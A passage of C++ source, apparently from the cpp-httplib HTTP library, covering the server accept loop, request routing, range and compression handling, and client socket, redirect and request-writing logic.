        auto val = detail::select_read(svr_sock_, idle_interval_sec_,
                                       idle_interval_usec_);
        if (val == 0) { // Timeout
          task_queue-&gt;on_idle();
          continue;
        }
#ifndef _WIN32
      }
#endif

#if defined _WIN32
      // sockets conneced via WASAccept inherit flags NO_HANDLE_INHERIT,
      // OVERLAPPED
      socket_t sock = WSAAccept(svr_sock_, nullptr, nullptr, nullptr, 0);
#elif defined SOCK_CLOEXEC
      socket_t sock = accept4(svr_sock_, nullptr, nullptr, SOCK_CLOEXEC);
#else
      socket_t sock = accept(svr_sock_, nullptr, nullptr);
#endif

      if (sock == INVALID_SOCKET) {
        if (errno == EMFILE) {
          // The per-process limit of open file descriptors has been reached.
          // Try to accept new connections after a short sleep.
          std::this_thread::sleep_for(std::chrono::microseconds{1});
          continue;
        } else if (errno == EINTR || errno == EAGAIN) {
          continue;
        }
        if (svr_sock_ != INVALID_SOCKET) {
          detail::close_socket(svr_sock_);
          ret = false;
        } else {
          ; // The server socket was closed by user.
        }
        break;
      }

      detail::set_socket_opt_time(sock, SOL_SOCKET, SO_RCVTIMEO,
                                  read_timeout_sec_, read_timeout_usec_);
      detail::set_socket_opt_time(sock, SOL_SOCKET, SO_SNDTIMEO,
                                  write_timeout_sec_, write_timeout_usec_);

      if (!task_queue-&gt;enqueue(
              [this, sock]() { process_and_close_socket(sock); })) {
        detail::shutdown_socket(sock);
        detail::close_socket(sock);
      }
    }

    task_queue-&gt;shutdown();
  }

  is_decommisioned = !ret;
  return ret;
}

inline bool Server::routing(Request &amp;req, Response &amp;res, Stream &amp;strm) {
  if (pre_routing_handler_ &amp;&amp;
      pre_routing_handler_(req, res) == HandlerResponse::Handled) {
    return true;
  }

  // File handler
  auto is_head_request = req.method == "HEAD";
  if ((req.method == "GET" || is_head_request) &amp;&amp;
      handle_file_request(req, res, is_head_request)) {
    return true;
  }

  if (detail::expect_content(req)) {
    // Content reader handler
    {
      ContentReader reader(
          [&amp;](ContentReceiver receiver) {
            return read_content_with_content_receiver(
                strm, req, res, std::move(receiver), nullptr, nullptr);
          },
          [&amp;](MultipartContentHeader header, ContentReceiver receiver) {
            return read_content_with_content_receiver(strm, req, res, nullptr,
                                                      std::move(header),
                                                      std::move(receiver));
          });

      if (req.method == "POST") {
        if (dispatch_request_for_content_reader(
                req, res, std::move(reader),
                post_handlers_for_content_reader_)) {
          return true;
        }
      } else if (req.method == "PUT") {
        if (dispatch_request_for_content_reader(
                req, res, std::move(reader),
                put_handlers_for_content_reader_)) {
          return true;
        }
      } else if (req.method == "PATCH") {
        if (dispatch_request_for_content_reader(
                req, res, std::move(reader),
                patch_handlers_for_content_reader_)) {
          return true;
        }
      } else if (req.method == "DELETE") {
        if (dispatch_request_for_content_reader(
                req, res, std::move(reader),
                delete_handlers_for_content_reader_)) {
          return true;
        }
      }
    }

    // Read content into `req.body`
    if (!read_content(strm, req, res)) { return false; }
  }

  // Regular handler
  if (req.method == "GET" || req.method == "HEAD") {
    return dispatch_request(req, res, get_handlers_);
  } else if (req.method == "POST") {
    return dispatch_request(req, res, post_handlers_);
  } else if (req.method == "PUT") {
    return dispatch_request(req, res, put_handlers_);
  } else if (req.method == "DELETE") {
    return dispatch_request(req, res, delete_handlers_);
  } else if (req.method == "OPTIONS") {
    return dispatch_request(req, res, options_handlers_);
  } else if (req.method == "PATCH") {
    return dispatch_request(req, res, patch_handlers_);
  }

  res.status = StatusCode::BadRequest_400;
  return false;
}

inline bool Server::dispatch_request(Request &amp;req, Response &amp;res,
                                     const Handlers &amp;handlers) const {
  for (const auto &amp;x : handlers) {
    const auto &amp;matcher = x.first;
    const auto &amp;handler = x.second;

    if (matcher-&gt;match(req)) {
      handler(req, res);
      return true;
    }
  }
  return false;
}

inline void Server::apply_ranges(const Request &amp;req, Response &amp;res,
                                 std::string &amp;content_type,
                                 std::string &amp;boundary) const {
  if (req.ranges.size() &gt; 1 &amp;&amp; res.status == StatusCode::PartialContent_206) {
    auto it = res.headers.find("Content-Type");
    if (it != res.headers.end()) {
      content_type = it-&gt;second;
      res.headers.erase(it);
    }

    boundary = detail::make_multipart_data_boundary();

    res.set_header("Content-Type",
                   "multipart/byteranges; boundary=" + boundary);
  }

  auto type = detail::encoding_type(req, res);

  if (res.body.empty()) {
    if (res.content_length_ &gt; 0) {
      size_t length = 0;
      if (req.ranges.empty() || res.status != StatusCode::PartialContent_206) {
        length = res.content_length_;
      } else if (req.ranges.size() == 1) {
        auto offset_and_length = detail::get_range_offset_and_length(
            req.ranges[0], res.content_length_);

        length = offset_and_length.second;

        auto content_range = detail::make_content_range_header_field(
            offset_and_length, res.content_length_);
        res.set_header("Content-Range", content_range);
      } else {
        length = detail::get_multipart_ranges_data_length(
            req, boundary, content_type, res.content_length_);
      }
      res.set_header("Content-Length", std::to_string(length));
    } else {
      if (res.content_provider_) {
        if (res.is_chunked_content_provider_) {
          res.set_header("Transfer-Encoding", "chunked");
          if (type == detail::EncodingType::Gzip) {
            res.set_header("Content-Encoding", "gzip");
          } else if (type == detail::EncodingType::Brotli) {
            res.set_header("Content-Encoding", "br");
          }
        }
      }
    }
  } else {
    if (req.ranges.empty() || res.status != StatusCode::PartialContent_206) {
      ;
    } else if (req.ranges.size() == 1) {
      auto offset_and_length =
          detail::get_range_offset_and_length(req.ranges[0], res.body.size());
      auto offset = offset_and_length.first;
      auto length = offset_and_length.second;

      auto content_range = detail::make_content_range_header_field(
          offset_and_length, res.body.size());
      res.set_header("Content-Range", content_range);

      assert(offset + length &lt;= res.body.size());
      res.body = res.body.substr(offset, length);
    } else {
      std::string data;
      detail::make_multipart_ranges_data(req, res, boundary, content_type,
                                         res.body.size(), data);
      res.body.swap(data);
    }

    if (type != detail::EncodingType::None) {
      std::unique_ptr&lt;detail::compressor&gt; compressor;
      std::string content_encoding;

      if (type == detail::EncodingType::Gzip) {
#ifdef CPPHTTPLIB_ZLIB_SUPPORT
        compressor = detail::make_unique&lt;detail::gzip_compressor&gt;();
        content_encoding = "gzip";
#endif
      } else if (type == detail::EncodingType::Brotli) {
#ifdef CPPHTTPLIB_BROTLI_SUPPORT
        compressor = detail::make_unique&lt;detail::brotli_compressor&gt;();
        content_encoding = "br";
#endif
      }

      if (compressor) {
        std::string compressed;
        if (compressor-&gt;compress(res.body.data(), res.body.size(), true,
                                 [&amp;](const char *data, size_t data_len) {
                                   compressed.append(data, data_len);
                                   return true;
                                 })) {
          res.body.swap(compressed);
          res.set_header("Content-Encoding", content_encoding);
        }
      }
    }

    auto length = std::to_string(res.body.size());
    res.set_header("Content-Length", length);
  }
}

inline bool Server::dispatch_request_for_content_reader(
    Request &amp;req, Response &amp;res, ContentReader content_reader,
    const HandlersForContentReader &amp;handlers) const {
  for (const auto &amp;x : handlers) {
    const auto &amp;matcher = x.first;
    const auto &amp;handler = x.second;

    if (matcher-&gt;match(req)) {
      handler(req, res, content_reader);
      return true;
    }
  }
  return false;
}

inline bool
Server::process_request(Stream &amp;strm, const std::string &amp;remote_addr,
                        int remote_port, const std::string &amp;local_addr,
                        int local_port, bool close_connection,
                        bool &amp;connection_closed,
                        const std::function&lt;void(Request &amp;)&gt; &amp;setup_request) {
  std::array&lt;char, 2048&gt; buf{};

  detail::stream_line_reader line_reader(strm, buf.data(), buf.size());

  // Connection has been closed on client
  if (!line_reader.getline()) { return false; }

  Request req;

  Response res;
  res.version = "HTTP/1.1";
  res.headers = default_headers_;

#ifdef _WIN32
  // TODO: Increase FD_SETSIZE statically (libzmq), dynamically (MySQL).
#else
#ifndef CPPHTTPLIB_USE_POLL
  // Socket file descriptor exceeded FD_SETSIZE...
  if (strm.socket() &gt;= FD_SETSIZE) {
    Headers dummy;
    detail::read_headers(strm, dummy);
    res.status = StatusCode::InternalServerError_500;
    return write_response(strm, close_connection, req, res);
  }
#endif
#endif

  // Request line and headers
  if (!parse_request_line(line_reader.ptr(), req) ||
      !detail::read_headers(strm, req.headers)) {
    res.status = StatusCode::BadRequest_400;
    return write_response(strm, close_connection, req, res);
  }

  // Check if the request URI doesn't exceed the limit
  if (req.target.size() &gt; CPPHTTPLIB_REQUEST_URI_MAX_LENGTH) {
    Headers dummy;
    detail::read_headers(strm, dummy);
    res.status = StatusCode::UriTooLong_414;
    return write_response(strm, close_connection, req, res);
  }

  if (req.get_header_value("Connection") == "close") {
    connection_closed = true;
  }

  if (req.version == "HTTP/1.0" &amp;&amp;
      req.get_header_value("Connection") != "Keep-Alive") {
    connection_closed = true;
  }

  req.remote_addr = remote_addr;
  req.remote_port = remote_port;
  req.set_header("REMOTE_ADDR", req.remote_addr);
  req.set_header("REMOTE_PORT", std::to_string(req.remote_port));

  req.local_addr = local_addr;
  req.local_port = local_port;
  req.set_header("LOCAL_ADDR", req.local_addr);
  req.set_header("LOCAL_PORT", std::to_string(req.local_port));

  if (req.has_header("Range")) {
    const auto &amp;range_header_value = req.get_header_value("Range");
    if (!detail::parse_range_header(range_header_value, req.ranges)) {
      res.status = StatusCode::RangeNotSatisfiable_416;
      return write_response(strm, close_connection, req, res);
    }
  }

  if (setup_request) { setup_request(req); }

  if (req.get_header_value("Expect") == "100-continue") {
    int status = StatusCode::Continue_100;
    if (expect_100_continue_handler_) {
      status = expect_100_continue_handler_(req, res);
    }
    switch (status) {
    case StatusCode::Continue_100:
    case StatusCode::ExpectationFailed_417:
      detail::write_response_line(strm, status);
      strm.write("\r\n");
      break;
    default:
      connection_closed = true;
      return write_response(strm, true, req, res);
    }
  }

  // Setup `is_connection_closed` method
  req.is_connection_closed = [&amp;]() {
    return !detail::is_socket_alive(strm.socket());
  };

  // Routing
  auto routed = false;
#ifdef CPPHTTPLIB_NO_EXCEPTIONS
  routed = routing(req, res, strm);
#else
  try {
    routed = routing(req, res, strm);
  } catch (std::exception &amp;e) {
    if (exception_handler_) {
      auto ep = std::current_exception();
      exception_handler_(req, res, ep);
      routed = true;
    } else {
      res.status = StatusCode::InternalServerError_500;
      std::string val;
      auto s = e.what();
      for (size_t i = 0; s[i]; i++) {
        switch (s[i]) {
        case '\r': val += "\\r"; break;
        case '\n': val += "\\n"; break;
        default: val += s[i]; break;
        }
      }
      res.set_header("EXCEPTION_WHAT", val);
    }
  } catch (...) {
    if (exception_handler_) {
      auto ep = std::current_exception();
      exception_handler_(req, res, ep);
      routed = true;
    } else {
      res.status = StatusCode::InternalServerError_500;
      res.set_header("EXCEPTION_WHAT", "UNKNOWN");
    }
  }
#endif
  if (routed) {
    if (res.status == -1) {
      res.status = req.ranges.empty() ? StatusCode::OK_200
                                      : StatusCode::PartialContent_206;
    }

    // Serve file content by using a content provider
    if (!res.file_content_path_.empty()) {
      const auto &amp;path = res.file_content_path_;
      auto mm = std::make_shared&lt;detail::mmap&gt;(path.c_str());
      if (!mm-&gt;is_open()) {
        res.body.clear();
        res.content_length_ = 0;
        res.content_provider_ = nullptr;
        res.status = StatusCode::NotFound_404;
        return write_response(strm, close_connection, req, res);
      }

      auto content_type = res.file_content_content_type_;
      if (content_type.empty()) {
        content_type = detail::find_content_type(
            path, file_extension_and_mimetype_map_, default_file_mimetype_);
      }

      res.set_content_provider(
          mm-&gt;size(), content_type,
          [mm](size_t offset, size_t length, DataSink &amp;sink) -&gt; bool {
            sink.write(mm-&gt;data() + offset, length);
            return true;
          });
    }

    if (detail::range_error(req, res)) {
      res.body.clear();
      res.content_length_ = 0;
      res.content_provider_ = nullptr;
      res.status = StatusCode::RangeNotSatisfiable_416;
      return write_response(strm, close_connection, req, res);
    }

    return write_response_with_content(strm, close_connection, req, res);
  } else {
    if (res.status == -1) { res.status = StatusCode::NotFound_404; }

    return write_response(strm, close_connection, req, res);
  }
}

inline bool Server::is_valid() const { return true; }

inline bool Server::process_and_close_socket(socket_t sock) {
  std::string remote_addr;
  int remote_port = 0;
  detail::get_remote_ip_and_port(sock, remote_addr, remote_port);

  std::string local_addr;
  int local_port = 0;
  detail::get_local_ip_and_port(sock, local_addr, local_port);

  auto ret = detail::process_server_socket(
      svr_sock_, sock, keep_alive_max_count_, keep_alive_timeout_sec_,
      read_timeout_sec_, read_timeout_usec_, write_timeout_sec_,
      write_timeout_usec_,
      [&amp;](Stream &amp;strm, bool close_connection, bool &amp;connection_closed) {
        return process_request(strm, remote_addr, remote_port, local_addr,
                               local_port, close_connection, connection_closed,
                               nullptr);
      });

  detail::shutdown_socket(sock);
  detail::close_socket(sock);
  return ret;
}

// HTTP client implementation
inline ClientImpl::ClientImpl(const std::string &amp;host)
    : ClientImpl(host, 80, std::string(), std::string()) {}

inline ClientImpl::ClientImpl(const std::string &amp;host, int port)
    : ClientImpl(host, port, std::string(), std::string()) {}

inline ClientImpl::ClientImpl(const std::string &amp;host, int port,
                              const std::string &amp;client_cert_path,
                              const std::string &amp;client_key_path)
    : host_(detail::escape_abstract_namespace_unix_domain(host)), port_(port),
      host_and_port_(adjust_host_string(host_) + ":" + std::to_string(port)),
      client_cert_path_(client_cert_path), client_key_path_(client_key_path) {}

inline ClientImpl::~ClientImpl() {
  std::lock_guard&lt;std::mutex&gt; guard(socket_mutex_);
  shutdown_socket(socket_);
  close_socket(socket_);
}

inline bool ClientImpl::is_valid() const { return true; }

inline void ClientImpl::copy_settings(const ClientImpl &amp;rhs) {
  client_cert_path_ = rhs.client_cert_path_;
  client_key_path_ = rhs.client_key_path_;
  connection_timeout_sec_ = rhs.connection_timeout_sec_;
  read_timeout_sec_ = rhs.read_timeout_sec_;
  read_timeout_usec_ = rhs.read_timeout_usec_;
  write_timeout_sec_ = rhs.write_timeout_sec_;
  write_timeout_usec_ = rhs.write_timeout_usec_;
  max_timeout_msec_ = rhs.max_timeout_msec_;
  basic_auth_username_ = rhs.basic_auth_username_;
  basic_auth_password_ = rhs.basic_auth_password_;
  bearer_token_auth_token_ = rhs.bearer_token_auth_token_;
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  digest_auth_username_ = rhs.digest_auth_username_;
  digest_auth_password_ = rhs.digest_auth_password_;
#endif
  keep_alive_ = rhs.keep_alive_;
  follow_location_ = rhs.follow_location_;
  url_encode_ = rhs.url_encode_;
  address_family_ = rhs.address_family_;
  tcp_nodelay_ = rhs.tcp_nodelay_;
  ipv6_v6only_ = rhs.ipv6_v6only_;
  socket_options_ = rhs.socket_options_;
  compress_ = rhs.compress_;
  decompress_ = rhs.decompress_;
  interface_ = rhs.interface_;
  proxy_host_ = rhs.proxy_host_;
  proxy_port_ = rhs.proxy_port_;
  proxy_basic_auth_username_ = rhs.proxy_basic_auth_username_;
  proxy_basic_auth_password_ = rhs.proxy_basic_auth_password_;
  proxy_bearer_token_auth_token_ = rhs.proxy_bearer_token_auth_token_;
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  proxy_digest_auth_username_ = rhs.proxy_digest_auth_username_;
  proxy_digest_auth_password_ = rhs.proxy_digest_auth_password_;
#endif
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  ca_cert_file_path_ = rhs.ca_cert_file_path_;
  ca_cert_dir_path_ = rhs.ca_cert_dir_path_;
  ca_cert_store_ = rhs.ca_cert_store_;
#endif
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  server_certificate_verification_ = rhs.server_certificate_verification_;
  server_hostname_verification_ = rhs.server_hostname_verification_;
  server_certificate_verifier_ = rhs.server_certificate_verifier_;
#endif
  logger_ = rhs.logger_;
}

inline socket_t ClientImpl::create_client_socket(Error &amp;error) const {
  if (!proxy_host_.empty() &amp;&amp; proxy_port_ != -1) {
    return detail::create_client_socket(
        proxy_host_, std::string(), proxy_port_, address_family_, tcp_nodelay_,
        ipv6_v6only_, socket_options_, connection_timeout_sec_,
        connection_timeout_usec_, read_timeout_sec_, read_timeout_usec_,
        write_timeout_sec_, write_timeout_usec_, interface_, error);
  }

  // Check is custom IP specified for host_
  std::string ip;
  auto it = addr_map_.find(host_);
  if (it != addr_map_.end()) { ip = it-&gt;second; }

  return detail::create_client_socket(
      host_, ip, port_, address_family_, tcp_nodelay_, ipv6_v6only_,
      socket_options_, connection_timeout_sec_, connection_timeout_usec_,
      read_timeout_sec_, read_timeout_usec_, write_timeout_sec_,
      write_timeout_usec_, interface_, error);
}

inline bool ClientImpl::create_and_connect_socket(Socket &amp;socket,
                                                  Error &amp;error) {
  auto sock = create_client_socket(error);
  if (sock == INVALID_SOCKET) { return false; }
  socket.sock = sock;
  return true;
}

inline void ClientImpl::shutdown_ssl(Socket &amp; /*socket*/,
                                     bool /*shutdown_gracefully*/) {
  // If there are any requests in flight from threads other than us, then it's
  // a thread-unsafe race because individual ssl* objects are not thread-safe.
  assert(socket_requests_in_flight_ == 0 ||
         socket_requests_are_from_thread_ == std::this_thread::get_id());
}

inline void ClientImpl::shutdown_socket(Socket &amp;socket) const {
  if (socket.sock == INVALID_SOCKET) { return; }
  detail::shutdown_socket(socket.sock);
}

inline void ClientImpl::close_socket(Socket &amp;socket) {
  // If there are requests in flight in another thread, usually closing
  // the socket will be fine and they will simply receive an error when
  // using the closed socket, but it is still a bug since rarely the OS
  // may reassign the socket id to be used for a new socket, and then
  // suddenly they will be operating on a live socket that is different
  // than the one they intended!
  assert(socket_requests_in_flight_ == 0 ||
         socket_requests_are_from_thread_ == std::this_thread::get_id());

  // It is also a bug if this happens while SSL is still active
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  assert(socket.ssl == nullptr);
#endif
  if (socket.sock == INVALID_SOCKET) { return; }
  detail::close_socket(socket.sock);
  socket.sock = INVALID_SOCKET;
}

inline bool ClientImpl::read_response_line(Stream &amp;strm, const Request &amp;req,
                                           Response &amp;res) const {
  std::array&lt;char, 2048&gt; buf{};

  detail::stream_line_reader line_reader(strm, buf.data(), buf.size());

  if (!line_reader.getline()) { return false; }

#ifdef CPPHTTPLIB_ALLOW_LF_AS_LINE_TERMINATOR
  const static std::regex re("(HTTP/1\\.[01]) (\\d{3})(?: (.*?))?\r?\n");
#else
  const static std::regex re("(HTTP/1\\.[01]) (\\d{3})(?: (.*?))?\r\n");
#endif

  std::cmatch m;
  if (!std::regex_match(line_reader.ptr(), m, re)) {
    return req.method == "CONNECT";
  }
  res.version = std::string(m[1]);
  res.status = std::stoi(std::string(m[2]));
  res.reason = std::string(m[3]);

  // Ignore '100 Continue'
  while (res.status == StatusCode::Continue_100) {
    if (!line_reader.getline()) { return false; } // CRLF
    if (!line_reader.getline()) { return false; } // next response line

    if (!std::regex_match(line_reader.ptr(), m, re)) { return false; }
    res.version = std::string(m[1]);
    res.status = std::stoi(std::string(m[2]));
    res.reason = std::string(m[3]);
  }

  return true;
}

inline bool ClientImpl::send(Request &amp;req, Response &amp;res, Error &amp;error) {
  std::lock_guard&lt;std::recursive_mutex&gt; request_mutex_guard(request_mutex_);
  auto ret = send_(req, res, error);
  if (error == Error::SSLPeerCouldBeClosed_) {
    assert(!ret);
    ret = send_(req, res, error);
  }
  return ret;
}

inline bool ClientImpl::send_(Request &amp;req, Response &amp;res, Error &amp;error) {
  {
    std::lock_guard&lt;std::mutex&gt; guard(socket_mutex_);

    // Set this to false immediately - if it ever gets set to true by the end of
    // the request, we know another thread instructed us to close the socket.
    socket_should_be_closed_when_request_is_done_ = false;

    auto is_alive = false;
    if (socket_.is_open()) {
      is_alive = detail::is_socket_alive(socket_.sock);

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
      if (is_alive &amp;&amp; is_ssl()) {
        if (detail::is_ssl_peer_could_be_closed(socket_.ssl, socket_.sock)) {
          is_alive = false;
        }
      }
#endif

      if (!is_alive) {
        // Attempt to avoid sigpipe by shutting down nongracefully if it seems
        // like the other side has already closed the connection Also, there
        // cannot be any requests in flight from other threads since we locked
        // request_mutex_, so safe to close everything immediately
        const bool shutdown_gracefully = false;
        shutdown_ssl(socket_, shutdown_gracefully);
        shutdown_socket(socket_);
        close_socket(socket_);
      }
    }

    if (!is_alive) {
      if (!create_and_connect_socket(socket_, error)) { return false; }

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
      // TODO: refactoring
      if (is_ssl()) {
        auto &amp;scli = static_cast&lt;SSLClient &amp;&gt;(*this);
        if (!proxy_host_.empty() &amp;&amp; proxy_port_ != -1) {
          auto success = false;
          if (!scli.connect_with_proxy(socket_, req.start_time_, res, success,
                                       error)) {
            return success;
          }
        }

        if (!scli.initialize_ssl(socket_, error)) { return false; }
      }
#endif
    }

    // Mark the current socket as being in use so that it cannot be closed by
    // anyone else while this request is ongoing, even though we will be
    // releasing the mutex.
    if (socket_requests_in_flight_ &gt; 1) {
      assert(socket_requests_are_from_thread_ == std::this_thread::get_id());
    }
    socket_requests_in_flight_ += 1;
    socket_requests_are_from_thread_ = std::this_thread::get_id();
  }

  for (const auto &amp;header : default_headers_) {
    if (req.headers.find(header.first) == req.headers.end()) {
      req.headers.insert(header);
    }
  }

  auto ret = false;
  auto close_connection = !keep_alive_;

  auto se = detail::scope_exit([&amp;]() {
    // Briefly lock mutex in order to mark that a request is no longer ongoing
    std::lock_guard&lt;std::mutex&gt; guard(socket_mutex_);
    socket_requests_in_flight_ -= 1;
    if (socket_requests_in_flight_ &lt;= 0) {
      assert(socket_requests_in_flight_ == 0);
      socket_requests_are_from_thread_ = std::thread::id();
    }

    if (socket_should_be_closed_when_request_is_done_ || close_connection ||
        !ret) {
      shutdown_ssl(socket_, true);
      shutdown_socket(socket_);
      close_socket(socket_);
    }
  });

  ret = process_socket(socket_, req.start_time_, [&amp;](Stream &amp;strm) {
    return handle_request(strm, req, res, close_connection, error);
  });

  if (!ret) {
    if (error == Error::Success) { error = Error::Unknown; }
  }

  return ret;
}

inline Result ClientImpl::send(const Request &amp;req) {
  auto req2 = req;
  return send_(std::move(req2));
}

inline Result ClientImpl::send_(Request &amp;&amp;req) {
  auto res = detail::make_unique&lt;Response&gt;();
  auto error = Error::Success;
  auto ret = send(req, *res, error);
  return Result{ret ? std::move(res) : nullptr, error, std::move(req.headers)};
}

inline bool ClientImpl::handle_request(Stream &amp;strm, Request &amp;req,
                                       Response &amp;res, bool close_connection,
                                       Error &amp;error) {
  if (req.path.empty()) {
    error = Error::Connection;
    return false;
  }

  auto req_save = req;

  bool ret;

  if (!is_ssl() &amp;&amp; !proxy_host_.empty() &amp;&amp; proxy_port_ != -1) {
    auto req2 = req;
    req2.path = "http://" + host_and_port_ + req.path;
    ret = process_request(strm, req2, res, close_connection, error);
    req = req2;
    req.path = req_save.path;
  } else {
    ret = process_request(strm, req, res, close_connection, error);
  }

  if (!ret) { return false; }

  if (res.get_header_value("Connection") == "close" ||
      (res.version == "HTTP/1.0" &amp;&amp; res.reason != "Connection established")) {
    // TODO this requires a not-entirely-obvious chain of calls to be correct
    // for this to be safe.

    // This is safe to call because handle_request is only called by send_
    // which locks the request mutex during the process. It would be a bug
    // to call it from a different thread since it's a thread-safety issue
    // to do these things to the socket if another thread is using the socket.
    std::lock_guard&lt;std::mutex&gt; guard(socket_mutex_);
    shutdown_ssl(socket_, true);
    shutdown_socket(socket_);
    close_socket(socket_);
  }

  if (300 &lt; res.status &amp;&amp; res.status &lt; 400 &amp;&amp; follow_location_) {
    req = req_save;
    ret = redirect(req, res, error);
  }

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  if ((res.status == StatusCode::Unauthorized_401 ||
       res.status == StatusCode::ProxyAuthenticationRequired_407) &amp;&amp;
      req.authorization_count_ &lt; 5) {
    auto is_proxy = res.status == StatusCode::ProxyAuthenticationRequired_407;
    const auto &amp;username =
        is_proxy ? proxy_digest_auth_username_ : digest_auth_username_;
    const auto &amp;password =
        is_proxy ? proxy_digest_auth_password_ : digest_auth_password_;

    if (!username.empty() &amp;&amp; !password.empty()) {
      std::map&lt;std::string, std::string&gt; auth;
      if (detail::parse_www_authenticate(res, auth, is_proxy)) {
        Request new_req = req;
        new_req.authorization_count_ += 1;
        new_req.headers.erase(is_proxy ? "Proxy-Authorization"
                                       : "Authorization");
        new_req.headers.insert(detail::make_digest_authentication_header(
            req, auth, new_req.authorization_count_, detail::random_string(10),
            username, password, is_proxy));

        Response new_res;

        ret = send(new_req, new_res, error);
        if (ret) { res = new_res; }
      }
    }
  }
#endif

  return ret;
}

inline bool ClientImpl::redirect(Request &amp;req, Response &amp;res, Error &amp;error) {
  if (req.redirect_count_ == 0) {
    error = Error::ExceedRedirectCount;
    return false;
  }

  auto location = res.get_header_value("location");
  if (location.empty()) { return false; }

  const static std::regex re(
      R"((?:(https?):)?(?://(?:\[([a-fA-F\d:]+)\]|([^:/?#]+))(?::(\d+))?)?([^?#]*)(\?[^#]*)?(?:#.*)?)");

  std::smatch m;
  if (!std::regex_match(location, m, re)) { return false; }

  auto scheme = is_ssl() ? "https" : "http";

  auto next_scheme = m[1].str();
  auto next_host = m[2].str();
  if (next_host.empty()) { next_host = m[3].str(); }
  auto port_str = m[4].str();
  auto next_path = m[5].str();
  auto next_query = m[6].str();

  auto next_port = port_;
  if (!port_str.empty()) {
    next_port = std::stoi(port_str);
  } else if (!next_scheme.empty()) {
    next_port = next_scheme == "https" ? 443 : 80;
  }

  if (next_scheme.empty()) { next_scheme = scheme; }
  if (next_host.empty()) { next_host = host_; }
  if (next_path.empty()) { next_path = "/"; }

  auto path = detail::decode_url(next_path, true) + next_query;

  if (next_scheme == scheme &amp;&amp; next_host == host_ &amp;&amp; next_port == port_) {
    return detail::redirect(*this, req, res, path, location, error);
  } else {
    if (next_scheme == "https") {
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
      SSLClient cli(next_host, next_port);
      cli.copy_settings(*this);
      if (ca_cert_store_) { cli.set_ca_cert_store(ca_cert_store_); }
      return detail::redirect(cli, req, res, path, location, error);
#else
      return false;
#endif
    } else {
      ClientImpl cli(next_host, next_port);
      cli.copy_settings(*this);
      return detail::redirect(cli, req, res, path, location, error);
    }
  }
}

inline bool ClientImpl::write_content_with_provider(Stream &amp;strm,
                                                    const Request &amp;req,
                                                    Error &amp;error) const {
  auto is_shutting_down = []() { return false; };

  if (req.is_chunked_content_provider_) {
    // TODO: Brotli support
    std::unique_ptr&lt;detail::compressor&gt; compressor;
#ifdef CPPHTTPLIB_ZLIB_SUPPORT
    if (compress_) {
      compressor = detail::make_unique&lt;detail::gzip_compressor&gt;();
    } else
#endif
    {
      compressor = detail::make_unique&lt;detail::nocompressor&gt;();
    }

    return detail::write_content_chunked(strm, req.content_provider_,
                                         is_shutting_down, *compressor, error);
  } else {
    return detail::write_content(strm, req.content_provider_, 0,
                                 req.content_length_, is_shutting_down, error);
  }
}

inline bool ClientImpl::write_request(Stream &amp;strm, Request &amp;req,
                                      bool close_connection, Error &amp;error) {
  // Prepare additional headers
  if (close_connection) {
    if (!req.has_header("Connection")) {
      req.set_header("Connection", "close");
    }
  }

  if (!req.has_header("Host")) {
    if (is_ssl()) {
      if (port_ == 443) {
        req.set_header("Host", host_);
      } else {
        req.set_header("Host", host_and_port_);
      }
    } else {
      if (port_ == 80) {
        req.set_header("Host", host_);
      } else {
        req.set_header("Host", host_and_port_);
      }
    }
  }

  if (!req.has_header("Accept")) { req.set_header("Accept", "*/*"); }

  if (!req.content_receiver) {
    if (!req.has_header("Accept-Encoding")) {
      std::string accept_encoding;
#ifdef CPPHTTPLIB_BROTLI_SUPPORT
      accept_encoding = "br";
#endif
#ifdef CPPHTTPLIB_ZLIB_SUPPORT
      if (!accept_encoding.empty()) { accept_encoding += ", "; }
      accept_encoding += "gzip, deflate";
#endif
      req.set_header("Accept-Encoding", accept_encoding);
    }

#ifndef CPPHTTPLIB_NO_DEFAULT_USER_AGENT
    if (!req.has_header("User-Agent")) {
      auto agent = std::string("cpp-httplib/") + CPPHTTPLIB_VERSION;
      req.set_header("User-Agent", agent);
    }
#endif
  };

  if (req.body.empty()) {
    if (req.content_provider_) {
      if (!req.is_chunked_content_provider_) {
        if (!req.has_header("Content-Length")) {
          auto length = std::to_string(req.content_length_);
          req.set_header("Content-Length", length);
        }
      }
    } else {
      if (req.method == "POST" || req.method == "PUT" ||
          req.method == "PATCH") {
        req.set_header("Content-Length", "0");
      }
    }
  } else {
    if (!req.has_header("Content-Type")) {
      req.set_header("Content-Type", "text/plain");
    }

    if (!req.has_header("Content-Length")) {
      auto length = std::to_string(req.body.size());
      req.set_header("Content-Length", length);
    }
  }

  if (!basic_auth_password_.empty() || !basic_auth_username_.empty()) {
    if (!req.has_header("Authorization")) {
      req.headers.insert(make_basic_authentication_header(
          basic_auth_username_, basic_auth_password_, false));
    }
  }

  if (!proxy_basic_auth_username_.empty() &amp;&amp;
      !proxy_basic_auth_password_.empty()) {
    if (!req.has_header("Proxy-Authorization")) {
      req.headers.insert(make_basic_authentication_header(
          proxy_basic_auth_username_, proxy_basic_auth_password_, true));
    }
  }

  if (!bearer_token_auth_token_.empty()) {
    if (!req.has_header("Authorization")) {
      req.headers.insert(make_bearer_token_authentication_header(
          bearer_token_auth_token_, false));
    }
  }

  if (!proxy_bearer_token_auth_token_.empty()) {
    if (!req.has_header("Proxy-Authorization")) {
      req.headers.insert(make_bearer_token_authentication_header(
          proxy_bearer_token_auth_token_, true));
    }
  }

  // Request line and headers
  {
    detail::BufferStream bstrm;

    const auto &amp;path_with_query =
        req.params.empty() ? req.path
                           : append_query_params(req.path, req.params);

    const auto &amp;path =
        url_encode_ ? detail::encode_url(path_with_query) : path_with_query;

    detail::write_request_line(bstrm, req.method, path);

    header_writer_(bstrm, req.headers);

    // Flush buffer
    auto &amp;data = bstrm.get_buffer();
    if (!detail::write_data(strm, data.data(), data.size())) {
      error = Error::Write;
      return false;
    }
  }

  // Body
  if (req.body.empty()) {
    return write_content_with_provider(strm, req, error);
  }

  if (!detail::write_data(strm, req.body.data(), req.body.size())) {
    error = Error::Write;
    return false;
  }

  return true;
}

inline std::unique_ptr&lt;Response&gt; ClientImpl::send_with_content_provider(
